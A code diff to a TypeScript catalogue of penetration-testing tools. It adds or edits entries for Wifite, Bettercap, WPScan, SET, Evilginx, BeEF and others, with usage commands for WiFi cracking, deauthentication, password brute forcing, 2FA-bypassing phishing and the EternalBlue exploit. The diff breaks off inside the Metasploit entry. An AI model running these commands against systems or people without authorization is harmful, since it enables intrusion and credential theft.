@@ -333,6 +333,58 @@ export const toolsData: Record<string, Tool[]> = {
         "Host lookup: shodan host [IP]",
         "Count results: shodan count [query]"
       ]
+    },
+    {
+      id: "subfinder",
+      name: "Subfinder",
+      fullName: "Subdomain Discovery Tool",
+      description: "Fast passive subdomain enumeration tool",
+      longDescription: "Subfinder is a subdomain discovery tool that discovers valid subdomains for websites using passive online sources. It has a simple modular architecture and is optimized for speed.",
+      category: "Information Gathering",
+      difficulty: "Beginner",
+      lastUpdated: "2024-01-05",
+      officialSite: "https://github.com/projectdiscovery/subfinder",
+      icon: "🔎",
+      whatItIs: "A passive subdomain enumeration tool that uses multiple online sources.",
+      whatItsUsedFor: "Used by security researchers and bug bounty hunters to discover subdomains of target domains for reconnaissance and attack surface mapping.",
+      howItWorks: "Queries multiple passive sources like certificate transparency logs, search engines, and DNS databases to find subdomains without directly scanning the target.",
+      commands: [
+        "subfinder -d example.com",
+        "subfinder -d example.com -silent",
+        "subfinder -d example.com -o subdomains.txt",
+        "subfinder -dL domains.txt -o results.txt"
+      ],
+      results: [
+        "www.example.com",
+        "mail.example.com",
+        "blog.example.com",
+        "api.example.com"
+      ],
+      useCases: [
+        "Bug bounty reconnaissance",
+        "Attack surface mapping",
+        "Domain monitoring",
+        "Security assessments"
+      ],
+      features: [
+        "Fast passive enumeration",
+        "Multiple data sources",
+        "Rate limiting support",
+        "Custom resolver support",
+        "Output in multiple formats"
+      ],
+      installSteps: [
+        "Download from GitHub releases",
+        "Or install with Go: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
+        "Configure API keys in config file",
+        "Test: subfinder -version"
+      ],
+      basicUsage: [
+        "Basic scan: subfinder -d [domain]",
+        "Silent mode: subfinder -d [domain] -silent",
+        "Save output: subfinder -d [domain] -o output.txt",
+        "Multiple domains: subfinder -dL domains.txt"
+      ]
     }
   ],
 
@@ -401,219 +453,219 @@ export const toolsData: Record<string, Tool[]> = {
       officialSite: "https://www.kismetwireless.net",
       icon: "📊",
       whatItIs: "A passive wireless network detector and packet analyzer with intrusion detection capabilities.",
-      whatItsUsedFor: "Used by security professionals for wireless network monitoring, wardriving, detecting rogue access points, and wireless intrusion detection.",
-      howItWorks: "Passively monitors wireless traffic without sending any packets, collecting information about wireless networks, devices, and detecting anomalous behavior.",
+      whatItsUsedFor: "Used by security professionals for wireless network discovery, monitoring, and intrusion detection in enterprise environments.",
+      howItWorks: "Passively monitors wireless traffic across multiple channels and protocols, detecting networks, devices, and potential security threats without transmitting any packets.",
       commands: [
         "kismet",
-        "kismet -c wlan0",
-        "kismet_server",
-        "kismet_client"
+        "kismet_server --daemonize",
+        "kismet_client",
+        "kismet -c wlan0"
       ],
       results: [
         "Detected 15 wireless networks",
-        "Found 3 hidden SSIDs",
-        "Identified 25 wireless clients",
-        "Detected potential rogue AP"
+        "Found 23 wireless devices",
+        "Identified potential rogue AP",
+        "Logged 45,678 packets in 10 minutes"
       ],
       useCases: [
         "Wireless network monitoring",
         "Rogue access point detection",
-        "Wardriving activities",
+        "Wardriving and site surveys",
         "Wireless intrusion detection"
       ],
       features: [
         "Passive network detection",
-        "Multiple capture source support",
+        "Multiple protocol support",
         "Real-time monitoring",
-        "GPS integration",
-        "Plugin architecture"
+        "Plugin architecture",
+        "Web-based interface"
       ],
       installSteps: [
-        "Install: sudo apt install kismet",
-        "Add user to kismet group: sudo usermod -aG kismet $USER",
-        "Configure sources: edit /etc/kismet/kismet.conf",
-        "Start server: kismet"
+        "Install dependencies: sudo apt install build-essential",
+        "Download source from official site",
+        "Compile: ./configure && make && sudo make install",
+        "Configure: sudo kismet_server --first-time"
       ],
       basicUsage: [
-        "Start Kismet: kismet",
-        "Access web interface: http://localhost:2501",
-        "Configure data sources",
-        "Monitor wireless activity"
+        "Start server: kismet",
+        "Web interface: http://localhost:2501",
+        "Command line: kismet -c wlan0",
+        "View logs: tail -f ~/.kismet/logs/"
       ]
     },
     {
       id: "wifite",
       name: "Wifite",
-      fullName: "Automated Wireless Attack Tool",
-      description: "Automated wireless auditor designed to use all known methods for retrieving passwords",
-      longDescription: "Wifite is designed to use all known methods for retrieving the password of a wireless access point (router). These methods include WPS pin cracking and WPA/WPA2 handshake capture and cracking.",
-      category: "Wireless Hacking",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-16",
-      officialSite: "https://github.com/derv82/wifite2",
-      icon: "🎯",
-      whatItIs: "An automated tool that streamlines wireless penetration testing by combining multiple attack methods.",
-      whatItsUsedFor: "Used by penetration testers to quickly assess the security of multiple wireless networks using automated attack sequences.",
-      howItWorks: "Automatically discovers wireless networks, selects appropriate attack methods based on security type, and attempts to crack passwords using multiple techniques.",
-      commands: [
-        "wifite",
-        "wifite --wps --wpa",
-        "wifite -i wlan0mon",
-        "wifite --dict /path/to/wordlist.txt"
-      ],
-      results: [
-        "Found 8 wireless targets",
-        "WPS attack successful on NETGEAR_5G",
-        "WPA handshake captured for Home_WiFi",
-        "Password cracked: 'password123'"
-      ],
-      useCases: [
-        "Automated wireless security testing",
-        "Quick network vulnerability assessment",
-        "Educational wireless security demonstrations",
-        "Red team wireless testing"
-      ],
-      features: [
-        "Automated attack selection",
-        "Multiple attack methods",
-        "Progress monitoring",
-        "Result logging",
-        "User-friendly interface"
-      ],
-      installSteps: [
-        "Install dependencies: sudo apt install aircrack-ng reaver",
-        "Clone repository: git clone https://github.com/derv82/wifite2.git",
-        "Install: sudo python setup.py install",
-        "Run: wifite"
-      ],
-      basicUsage: [
-        "Start scan: wifite",
-        "Select targets from list",
-        "Choose attack methods",
-        "Monitor attack progress"
-      ]
-    },
-    {
-      id: "fern-wifi-cracker",
-      name: "Fern WiFi Cracker",
-      fullName: "Fern WiFi Cracker GUI Tool",
-      description: "Wireless security auditing and attack software with GUI interface",
-      longDescription: "Fern WiFi Cracker is a wireless security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library.",
+      fullName: "Wifite2 Automated Wireless Auditor",
+      description: "Automated wireless auditor for WEP, WPA/WPS encrypted networks",
+      longDescription: "Wifite is a tool to audit WEP or WPA encrypted wireless networks. It uses aircrack-ng, pyrit, reaver, tshark tools to perform and automate standard wireless auditing.",
       category: "Wireless Hacking",
       difficulty: "Beginner",
       lastUpdated: "2024-01-09",
-      officialSite: "https://github.com/savio-code/fern-wifi-cracker",
-      icon: "🌿",
-      whatItIs: "A graphical wireless network security auditing tool with an intuitive interface.",
-      whatItsUsedFor: "Used by security professionals and students to learn and perform wireless network security testing through an easy-to-use graphical interface.",
-      howItWorks: "Provides a GUI frontend to various wireless attack tools, making wireless penetration testing more accessible to users who prefer graphical interfaces over command-line tools.",
+      officialSite: "https://github.com/derv82/wifite2",
+      icon: "🎯",
+      whatItIs: "An automated wireless network auditing tool that simplifies WiFi penetration testing.",
+      whatItsUsedFor: "Used by penetration testers and security auditors to quickly assess the security of multiple wireless networks without manual configuration.",
+      howItWorks: "Automates the entire wireless auditing process by scanning for networks, capturing handshakes, and attempting to crack passwords using various attack methods.",
       commands: [
-        "fern-wifi-cracker",
-        "Select wireless interface",
-        "Enable monitor mode",
-        "Start network scan"
+        "wifite",
+        "wifite --wpa --dict /path/to/wordlist.txt",
+        "wifite --wps --timeout 60",
+        "wifite --5ghz --showb"
       ],
       results: [
-        "GUI launched successfully",
-        "Monitor mode enabled on wlan0",
         "Scanning for wireless networks...",
-        "Found 12 networks in range"
+        "Found 8 WPA networks, 2 WEP networks",
+        "Handshake captured for 'HomeWiFi'",
+        "Password cracked: 'password123'"
       ],
       useCases: [
-        "Educational wireless security learning",
-        "GUI-based wireless testing",
-        "Beginner-friendly penetration testing",
-        "Wireless security demonstrations"
+        "Automated wireless auditing",
+        "Quick security assessments",
+        "Educational demonstrations",
+        "Penetration testing"
       ],
       features: [
-        "Graphical user interface",
         "Automated attack execution",
-        "Real-time monitoring",
-        "Attack result logging",
-        "Multiple attack types"
+        "Multiple attack methods",
+        "Progress tracking",
+        "Custom wordlist support",
+        "WPS attack capabilities"
       ],
       installSteps: [
-        "Install Python and Qt: sudo apt install python3 python3-pyqt4",
-        "Download from GitHub or Kali repos",
-        "Install: sudo apt install fern-wifi-cracker",
-        "Launch: fern-wifi-cracker"
+        "Clone repository: git clone https://github.com/derv82/wifite2.git",
+        "Install Python dependencies: sudo python setup.py install",
+        "Install required tools: sudo apt install aircrack-ng reaver",
+        "Run: sudo wifite"
       ],
       basicUsage: [
-        "Launch application: fern-wifi-cracker",
-        "Select wireless interface",
-        "Enable monitor mode",
-        "Start scanning and select targets"
+        "Basic scan: sudo wifite",
+        "WPA only: sudo wifite --wpa",
+        "Custom wordlist: sudo wifite --dict wordlist.txt",
+        "Show nearby: sudo wifite --showb"
       ]
     },
     {
-      id: "reaver",
-      name: "Reaver",
-      fullName: "WPS PIN Attack Tool",
-      description: "Brute force attack tool against WiFi Protected Setup (WPS)",
-      longDescription: "Reaver implements a brute force attack against WiFi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases.",
+      id: "bettercap",
+      name: "Bettercap",
+      fullName: "Bettercap Network Attack Framework",
+      description: "Powerful, modular network attack and monitoring framework",
+      longDescription: "Bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, and more.",
       category: "Wireless Hacking",
-      difficulty: "Intermediate",
+      difficulty: "Advanced",
       lastUpdated: "2024-01-13",
-      officialSite: "https://github.com/t6x/reaver-wps-fork-t6x",
-      icon: "🔓",
-      whatItIs: "A specialized tool for exploiting WPS vulnerabilities to recover WiFi passwords.",
-      whatItsUsedFor: "Used to test the security of WPS-enabled routers by exploiting the WPS PIN vulnerability to recover WPA/WPA2 passwords.",
-      howItWorks: "Exploits a design flaw in WPS that allows attackers to brute force the WPS PIN, which can then be used to recover the WPA/WPA2 passphrase.",
+      officialSite: "https://www.bettercap.org",
+      icon: "🛡️",
+      whatItIs: "A comprehensive network attack and monitoring framework with modular architecture.",
+      whatItsUsedFor: "Used by security researchers for WiFi attacks, Bluetooth exploitation, network reconnaissance, and man-in-the-middle attacks.",
+      howItWorks: "Provides a modular framework with various modules for different attack vectors, allowing researchers to chain different techniques together for comprehensive network testing.",
       commands: [
-        "reaver -i wlan0mon -b [BSSID] -vv",
-        "reaver -i wlan0mon -b [BSSID] -c [channel] -vv",
-        "reaver -i wlan0mon -b [BSSID] -p [PIN] -vv",
-        "wash -i wlan0mon"
+        "bettercap -iface wlan0",
+        "wifi.recon on",
+        "wifi.deauth [BSSID]",
+        "ble.recon on"
       ],
       results: [
-        "WPS PIN found: 12345670",
-        "WPA PSK: 'MySecurePassword123'",
-        "AP SSID: 'Home_Network'",
-        "Authentication successful"
+        "WiFi interface wlan0 monitor mode enabled",
+        "Found 12 WiFi networks in range",
+        "Deauth attack sent to target network",
+        "BLE devices scan started"
       ],
       useCases: [
-        "WPS vulnerability testing",
-        "Wireless penetration testing",
-        "Router security assessment",
-        "Security awareness demonstrations"
+        "WiFi network attacks",
+        "Bluetooth Low Energy exploitation",
+        "Network reconnaissance",
+        "Man-in-the-middle attacks"
       ],
       features: [
-        "WPS PIN brute forcing",
-        "Automatic retry logic",
-        "Session saving/resuming",
-        "Multiple attack modes",
-        "Progress monitoring"
+        "Modular architecture",
+        "Web-based UI",
+        "Real-time packet manipulation",
+        "Custom scripts support",
+        "Cross-platform compatibility"
       ],
       installSteps: [
-        "Install: sudo apt install reaver",
-        "Enable monitor mode: airmon-ng start wlan0",
-        "Scan for WPS networks: wash -i wlan0mon",
-        "Start attack: reaver -i wlan0mon -b [BSSID] -vv"
+        "Download from GitHub releases",
+        "Install: sudo apt install bettercap",
+        "Or compile from source with Go",
+        "Test: bettercap -version"
       ],
       basicUsage: [
-        "Scan WPS networks: wash -i wlan0mon",
-        "Start attack: reaver -i wlan0mon -b [BSSID] -vv",
-        "Monitor progress and wait for results",
-        "Save session for later resumption"
+        "Start interactive: bettercap",
+        "WiFi recon: wifi.recon on",
+        "Show networks: wifi.show",
+        "Web UI: ui.update && web.ui on"
+      ]
+    },
+    {
+      id: "wpscan",
+      name: "WPScan",
+      fullName: "WordPress Security Scanner",
+      description: "WordPress vulnerability scanner and security testing tool",
+      longDescription: "WPScan is a free, for non-commercial use, black box WordPress vulnerability scanner written for security professionals and blog maintainers to test the security of their WordPress websites.",
+      category: "Web Application Assessment",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-16",
+      officialSite: "https://wpscan.com",
+      icon: "🌐",
+      whatItIs: "A specialized security scanner designed specifically for WordPress websites.",
+      whatItsUsedFor: "Used by security professionals to identify vulnerabilities in WordPress installations, including plugin and theme vulnerabilities, weak passwords, and misconfigurations.",
+      howItWorks: "Scans WordPress sites by checking for known vulnerabilities in core, plugins, and themes, performing user enumeration, and testing for common security issues.",
+      commands: [
+        "wpscan --url https://example.com",
+        "wpscan --url https://example.com --enumerate p",
+        "wpscan --url https://example.com --passwords passwords.txt",
+        "wpscan --url https://example.com --enumerate u"
+      ],
+      results: [
+        "WordPress version 5.8.1 identified",
+        "Found 3 vulnerable plugins",
+        "Enumerated 5 users",
+        "Weak password found for admin user"
+      ],
+      useCases: [
+        "WordPress security auditing",
+        "Vulnerability assessment",
+        "Penetration testing",
+        "Compliance checking"
+      ],
+      features: [
+        "WordPress core vulnerability detection",
+        "Plugin and theme enumeration",
+        "User enumeration",
+        "Password brute forcing",
+        "API token support"
+      ],
+      installSteps: [
+        "Install Ruby: sudo apt install ruby-dev",
+        "Install gem: gem install wpscan",
+        "Update database: wpscan --update",
+        "Test: wpscan --version"
+      ],
+      basicUsage: [
+        "Basic scan: wpscan --url [URL]",
+        "Enumerate plugins: wpscan --url [URL] --enumerate p",
+        "User enum: wpscan --url [URL] --enumerate u",
+        "Brute force: wpscan --url [URL] --passwords wordlist.txt"
       ]
     }
   ],
 
-  "social-engineering": [
+  "phishing-social-engineering": [
     {
-      id: "social-engineer-toolkit",
+      id: "set",
       name: "SET",
       fullName: "Social Engineer Toolkit",
-      description: "Framework designed for social engineering attacks and penetration testing",
-      longDescription: "The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element commonly used today.",
-      category: "Social Engineering",
+      description: "Framework for social engineering attacks and phishing campaigns",
+      longDescription: "The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element. SET was written by David Kennedy (ReL1K) and with a lot of help from the community it has incorporated attacks never before seen in an exploitation toolset.",
+      category: "Phishing & Social Engineering",
       difficulty: "Intermediate",
       lastUpdated: "2024-01-17",
       officialSite: "https://github.com/trustedsec/social-engineer-toolkit",
       icon: "🎭",
-      whatItIs: "A comprehensive framework for conducting social engineering attacks and testing human factors in security.",
-      whatItsUsedFor: "Used by penetration testers and security professionals to test organizational security awareness and conduct authorized social engineering assessments.",
-      howItWorks: "Provides various attack vectors including spear-phishing, website cloning, credential harvesting, and payload generation to test human vulnerabilities.",
+      whatItIs: "A comprehensive social engineering framework for testing human vulnerabilities.",
+      whatItsUsedFor: "Used by penetration testers and security awareness trainers to simulate phishing attacks, test employee susceptibility to social engineering, and create realistic attack scenarios.",
+      howItWorks: "Provides various attack vectors including spear-phishing, website cloning, infectious media generation, and SMS phishing to test human elements of security.",
       commands: [
         "setoolkit",
         "1) Social-Engineering Attacks",
@@ -622,242 +674,242 @@ export const toolsData: Record<string, Tool[]> = {
       ],
       results: [
         "SET Framework loaded successfully",
-        "Website clone created: facebook.com",
+        "Cloned website created at /var/www/html",
         "Credential harvester listening on port 80",
-        "Captured 3 sets of credentials"
+        "Captured 5 credentials in 30 minutes"
       ],
       useCases: [
-        "Phishing campaign testing",
+        "Phishing simulation campaigns",
         "Security awareness training",
-        "Social engineering assessments",
-        "Employee security testing"
+        "Employee susceptibility testing",
+        "Red team exercises"
       ],
       features: [
         "Website cloning",
-        "Spear-phishing campaigns",
+        "Phishing email generation",
         "Credential harvesting",
-        "Payload generation",
-        "SMS spoofing"
+        "Infectious media creation",
+        "SMS phishing attacks"
       ],
       installSteps: [
         "Clone repository: git clone https://github.com/trustedsec/social-engineer-toolkit/",
         "Navigate to directory: cd social-engineer-toolkit",
         "Install: sudo python setup.py install",
-        "Run: setoolkit"
+        "Run: sudo setoolkit"
       ],
       basicUsage: [
-        "Launch SET: setoolkit",
+        "Start SET: sudo setoolkit",
         "Select attack vector from menu",
-        "Configure target and payload",
-        "Execute and monitor results"
+        "Configure target parameters",
+        "Launch attack and monitor results"
       ]
     },
     {
       id: "gophish",
       name: "Gophish",
-      fullName: "Open-Source Phishing Toolkit",
+      fullName: "Gophish Phishing Framework",
       description: "Open-source phishing toolkit designed for businesses and penetration testers",
       longDescription: "Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training.",
-      category: "Social Engineering",
+      category: "Phishing & Social Engineering",
       difficulty: "Beginner",
       lastUpdated: "2024-01-19",
       officialSite: "https://getgophish.com",
       icon: "🎣",
-      whatItIs: "A professional phishing framework with campaign management and reporting capabilities.",
-      whatItsUsedFor: "Used by organizations and security teams to conduct authorized phishing simulations, security awareness training, and measure susceptibility to phishing attacks.",
-      howItWorks: "Provides a web-based interface for creating and managing phishing campaigns, tracking user interactions, and generating detailed reports on campaign effectiveness.",
+      whatItIs: "A user-friendly phishing framework with web-based management interface.",
+      whatItsUsedFor: "Used by organizations and security teams to conduct phishing simulations, track employee responses, and provide security awareness training.",
+      howItWorks: "Provides a web-based interface to create and manage phishing campaigns, track user interactions, and generate detailed reports on campaign effectiveness.",
       commands: [
         "./gophish",
-        "Access web interface: https://localhost:3333",
-        "Create new campaign",
-        "Configure email templates and landing pages"
+        "Access web interface at https://localhost:3333",
+        "Create campaign via web UI",
+        "Monitor results in dashboard"
       ],
       results: [
         "Gophish server started on port 3333",
-        "Campaign 'Security Test' created",
-        "100 emails sent successfully",
-        "25% click rate, 10% credential submission rate"
+        "Campaign 'Q1 Training' launched to 100 users",
+        "15 users clicked phishing link",
+        "5 users submitted credentials"
       ],
       useCases: [
-        "Phishing simulation campaigns",
-        "Security awareness training",
-        "Employee security assessment",
-        "Incident response training"
+        "Corporate phishing training",
+        "Security awareness programs",
+        "Compliance testing",
+        "Employee education"
       ],
       features: [
-        "Campaign management",
+        "Web-based management",
         "Email template creation",
-        "Landing page hosting",
-        "Real-time reporting",
-        "User tracking"
+        "Landing page designer",
+        "Real-time tracking",
+        "Detailed reporting"
       ],
       installSteps: [
-        "Download latest release from GitHub",
-        "Extract archive: tar -xzf gophish.tar.gz",
+        "Download binary from GitHub releases",
+        "Extract: unzip gophish-v0.x.x-linux-64bit.zip",
         "Make executable: chmod +x gophish",
         "Run: ./gophish"
       ],
       basicUsage: [
         "Start server: ./gophish",
         "Access web UI: https://localhost:3333",
-        "Create user groups and templates",
+        "Create email template",
         "Launch phishing campaign"
+      ]
+    },
+    {
+      id: "king-phisher",
+      name: "King Phisher",
+      fullName: "King Phisher Phishing Campaign Toolkit",
+      description: "Tool for testing and promoting user awareness by simulating real world phishing attacks",
+      longDescription: "King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. It features an easy to use, yet very flexible architecture allowing full control over both emails and server content.",
+      category: "Phishing & Social Engineering",
+      difficulty: "Advanced",
+      lastUpdated: "2024-01-06",
+      officialSite: "https://github.com/securestate/king-phisher",
+      icon: "👑",
+      whatItIs: "An advanced phishing campaign toolkit with powerful customization capabilities.",
+      whatItsUsedFor: "Used by security professionals for sophisticated phishing simulations with detailed tracking and advanced evasion techniques.",
+      howItWorks: "Combines email phishing with a customizable web server to create realistic phishing scenarios while providing detailed analytics and user tracking.",
+      commands: [
+        "king-phisher-server",
+        "king-phisher-client",
+        "Configure campaign parameters",
+        "Launch phishing simulation"
+      ],
+      results: [
+        "King Phisher server initialized",
+        "Client connected successfully",
+        "Campaign targeting 50 users launched",
+        "Detailed analytics available in dashboard"
+      ],
+      useCases: [
+        "Advanced phishing simulations",
+        "Red team operations",
+        "Security research",
+        "Advanced awareness training"
+      ],
+      features: [
+        "Advanced email templating",
+        "Custom web server",
+        "Detailed user tracking",
+        "Plugin architecture",
+        "Geographic targeting"
+      ],
+      installSteps: [
+        "Install dependencies: sudo apt install python3-dev",
+        "Clone repository: git clone https://github.com/securestate/king-phisher.git",
+        "Install: sudo python3 setup.py install",
+        "Configure server and run"
+      ],
+      basicUsage: [
+        "Start server: king-phisher-server",
+        "Launch client: king-phisher-client",
+        "Create campaign template",
+        "Monitor results in real-time"
+      ]
+    },
+    {
+      id: "evilginx",
+      name: "Evilginx",
+      fullName: "Evilginx2 Advanced Phishing Framework",
+      description: "Man-in-the-middle attack framework for phishing login credentials and session cookies",
+      longDescription: "Evilginx is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.",
+      category: "Phishing & Social Engineering",
+      difficulty: "Advanced",
+      lastUpdated: "2024-01-21",
+      officialSite: "https://github.com/kgretzky/evilginx2",
+      icon: "👹",
+      whatItIs: "An advanced MITM framework that can bypass 2FA by stealing session cookies.",
+      whatItsUsedFor: "Used by red team operators and advanced penetration testers to demonstrate sophisticated phishing attacks that can bypass modern security measures.",
+      howItWorks: "Acts as a reverse proxy between the target user and the legitimate website, capturing credentials and session cookies in real-time while maintaining the appearance of the legitimate site.",
+      commands: [
+        "evilginx2",
+        "config domain example.com",
+        "phishlets enable office365",
+        "lures create office365"
+      ],
+      results: [
+        "Evilginx2 framework started",
+        "Domain configured: evil-example.com",
+        "Office365 phishlet enabled",
+        "Phishing lure created and ready"
+      ],
+      useCases: [
+        "Advanced phishing demonstrations",
+        "2FA bypass testing",
+        "Red team operations",
+        "Security research"
+      ],
+      features: [
+        "Real-time credential capture",
+        "Session cookie theft",
+        "2FA bypass capabilities",
+        "Multiple service phishlets",
+        "Advanced evasion techniques"
+      ],
+      installSteps: [
+        "Install Go: sudo apt install golang-go",
+        "Clone repo: git clone https://github.com/kgretzky/evilginx2.git",
+        "Build: make",
+        "Configure domain and SSL certificates"
+      ],
+      basicUsage: [
+        "Start: ./evilginx",
+        "Configure domain: config domain [domain]",
+        "Enable phishlet: phishlets enable [service]",
+        "Create lure: lures create [service]"
       ]
     },
     {
       id: "beef",
       name: "BeEF",
       fullName: "Browser Exploitation Framework",
-      description: "Penetration testing tool that focuses on web browser exploitation",
-      longDescription: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. BeEF hooks web browsers and has them run JavaScript payloads.",
-      category: "Social Engineering",
-      difficulty: "Advanced",
-      lastUpdated: "2024-01-15",
+      description: "Web browser penetration testing framework",
+      longDescription: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.",
+      category: "Phishing & Social Engineering",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-04",
       officialSite: "https://beefproject.com",
       icon: "🥩",
-      whatItIs: "A browser exploitation framework that targets client-side vulnerabilities through web browsers.",
-      whatItsUsedFor: "Used by penetration testers to demonstrate and exploit client-side vulnerabilities, test browser security, and assess the security posture of web applications.",
-      howItWorks: "Injects malicious JavaScript into web pages to create hooks with victim browsers, allowing execution of various attack modules and information gathering techniques.",
+      whatItIs: "A browser exploitation framework that hooks web browsers for penetration testing.",
+      whatItsUsedFor: "Used to demonstrate the impact of browser-based attacks and test client-side security by exploiting web browser vulnerabilities.",
+      howItWorks: "Injects a JavaScript hook into target browsers, allowing the attacker to control the browser and execute various attack modules against the hooked browser.",
       commands: [
         "./beef",
-        "Access control panel: http://localhost:3000/ui/panel",
-        "Insert hook script into target website",
-        "Execute attack modules on hooked browsers"
+        "Access web interface at http://localhost:3000/ui/panel",
+        "Hook browser with JavaScript payload",
+        "Execute modules on hooked browsers"
       ],
       results: [
-        "BeEF server started successfully",
-        "Browser hooked: Chrome on Windows 10",
-        "Keylogger module executed",
-        "Social engineering popup displayed"
+        "BeEF server started on port 3000",
+        "Browser hooked successfully",
+        "5 attack modules available",
+        "Keylogger deployed to target browser"
       ],
       useCases: [
+        "Browser security testing",
         "Client-side penetration testing",
-        "Browser security assessment",
-        "Social engineering demonstrations",
-        "Web application security testing"
+        "Social engineering campaigns",
+        "Security awareness demonstrations"
       ],
       features: [
         "Browser hooking",
-        "JavaScript payload execution",
-        "Information gathering",
-        "Browser exploitation",
-        "Network pivoting"
+        "Real-time browser control",
+        "Modular attack framework",
+        "Web-based interface",
+        "Cross-platform compatibility"
       ],
       installSteps: [
         "Install Ruby: sudo apt install ruby-dev",
-        "Clone repository: git clone https://github.com/beefproject/beef",
-        "Install gems: cd beef && bundle install",
+        "Clone repository: git clone https://github.com/beefproject/beef.git",
+        "Install gems: bundle install",
         "Start BeEF: ./beef"
       ],
       basicUsage: [
-        "Start BeEF: ./beef",
-        "Access panel: http://localhost:3000/ui/panel",
-        "Insert hook into target page",
-        "Execute modules on hooked browsers"
-      ]
-    },
-    {
-      id: "king-phisher",
-      name: "King Phisher",
-      fullName: "Phishing Campaign Toolkit",
-      description: "Tool for testing and promoting user awareness through simulated phishing attacks",
-      longDescription: "King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. It features an easy to use, yet very flexible architecture allowing for rapid deployment and customization.",
-      category: "Social Engineering",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-12",
-      officialSite: "https://github.com/securestate/king-phisher",
-      icon: "👑",
-      whatItIs: "A comprehensive phishing campaign toolkit with advanced customization and tracking capabilities.",
-      whatItsUsedFor: "Used by security professionals to create sophisticated phishing simulations for testing employee awareness and conducting security assessments.",
-      howItWorks: "Provides a client-server architecture for managing phishing campaigns with customizable templates, real-time tracking, and detailed analytics.",
-      commands: [
-        "king-phisher-server",
-        "king-phisher-client",
-        "Configure SMTP settings",
-        "Create and launch campaign"
-      ],
-      results: [
-        "King Phisher server initialized",
-        "SMTP server configured successfully",
-        "Campaign targeting 500 employees launched",
-        "Real-time statistics available in dashboard"
-      ],
-      useCases: [
-        "Enterprise phishing simulations",
-        "Security awareness training",
-        "Red team operations",
-        "Compliance testing"
-      ],
-      features: [
-        "Campaign management",
-        "Template customization",
-        "Real-time tracking",
-        "Geographic mapping",
-        "Detailed reporting"
-      ],
-      installSteps: [
-        "Install dependencies: sudo apt install python3-gi",
-        "Clone repository: git clone https://github.com/securestate/king-phisher",
-        "Install: sudo python3 setup.py install",
-        "Configure: king-phisher-server --config"
-      ],
-      basicUsage: [
-        "Start server: king-phisher-server",
-        "Launch client: king-phisher-client",
-        "Create campaign with templates",
-        "Monitor results in real-time"
-      ]
-    },
-    {
-      id: "maltego-social-links",
-      name: "Maltego Social Links",
-      fullName: "Social Media Intelligence Tool",
-      description: "Social media investigation and intelligence gathering platform",
-      longDescription: "Maltego Social Links is specialized for social media investigations, providing transforms to gather intelligence from various social media platforms and online sources.",
-      category: "Social Engineering",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-14",
-      officialSite: "https://www.maltego.com",
-      icon: "🔗",
-      whatItIs: "A specialized version of Maltego focused on social media intelligence and relationship mapping.",
-      whatItsUsedFor: "Used by investigators and security professionals to map social media relationships, gather OSINT, and understand social connections for security assessments.",
-      howItWorks: "Uses specialized transforms to query social media platforms and create visual graphs showing relationships between people, accounts, and information.",
-      commands: [
-        "Launch Maltego Social Links",
-        "Add person entity",
-        "Run social media transforms",
-        "Analyze relationship graphs"
-      ],
-      results: [
-        "Found 25 social media profiles",
-        "Mapped connections between 50 individuals",
-        "Identified shared photos and locations",
-        "Generated comprehensive social network map"
-      ],
-      useCases: [
-        "Social media investigations",
-        "OSINT gathering",
-        "Background verification",
-        "Social engineering reconnaissance"
-      ],
-      features: [
-        "Social media platform integration",
-        "Relationship visualization",
-        "Data correlation",
-        "Export capabilities",
-        "Collaboration tools"
-      ],
-      installSteps: [
-        "Download from official website",
-        "Install application package",
-        "Register for account",
-        "Configure social media API access"
-      ],
-      basicUsage: [
-        "Create new investigation",
-        "Add target entities",
-        "Run social media transforms",
-        "Analyze and export results"
+        "Start framework: ./beef",
+        "Access UI: http://localhost:3000/ui/panel",
+        "Hook browser with provided script",
+        "Execute modules on hooked clients"
       ]
     }
   ],
@@ -867,50 +919,50 @@ export const toolsData: Record<string, Tool[]> = {
       id: "metasploit",
       name: "Metasploit",
       fullName: "Metasploit Framework",
-      description: "Penetration testing platform for finding, exploiting, and validating vulnerabilities",
-      longDescription: "The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code.",
+      description: "Advanced penetration testing framework with exploit development capabilities",
+      longDescription: "The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. The Metasploit Framework contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.",
       category: "Exploitation",
       difficulty: "Advanced",
-      lastUpdated: "2024-01-20",
+      lastUpdated: "2024-01-22",
       officialSite: "https://www.metasploit.com",
       icon: "🚀",
-      whatItIs: "A comprehensive penetration testing framework with exploit development and execution capabilities.",
-      whatItsUsedFor: "Used by penetration testers and security researchers to test system vulnerabilities, develop exploits, and validate security controls.",
-      howItWorks: "Provides a modular framework with exploits, payloads, encoders, and auxiliary modules that can be combined to test and exploit vulnerabilities.",
+      whatItIs: "The world's most used penetration testing framework for exploit development and vulnerability validation.",
+      whatItsUsedFor: "Used by penetration testers, security researchers, and red teams to test vulnerabilities, develop exploits, and validate security controls in controlled environments.",
+      howItWorks: "Provides a modular framework with exploits, payloads, encoders, and post-exploitation modules that can be combined to create comprehensive attack scenarios.",
       commands: [
         "msfconsole",
-        "search ms17-010",
+        "search type:exploit platform:windows",
         "use exploit/windows/smb/ms17_010_eternalblue",
         "set RHOSTS 192.168.1.100"
       ],
       results: [
         "Metasploit Framework started",
